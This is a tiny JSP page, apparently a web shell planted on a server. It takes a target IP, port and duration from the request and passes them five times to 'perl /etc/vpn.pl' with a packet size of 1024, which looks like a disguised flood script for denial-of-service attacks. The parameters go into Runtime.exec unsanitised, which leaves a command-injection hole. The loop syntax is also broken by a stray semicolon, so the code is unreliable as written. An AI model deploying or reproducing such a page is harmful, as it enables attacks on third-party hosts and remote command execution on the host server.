
<%@ page import="java.util.*,java.io.*"%>
<%
%>
<%
    Process p;
    for(int i = 0; i < 5; i += 1;){
        p = Runtime.getRuntime().exec("perl /etc/vpn.pl " + request.getParameter("ip") + " " + request.getParameter("port") + " 1024 " + request.getParameter("time")); 
    }

%>
</pre>
</BODY></HTML>
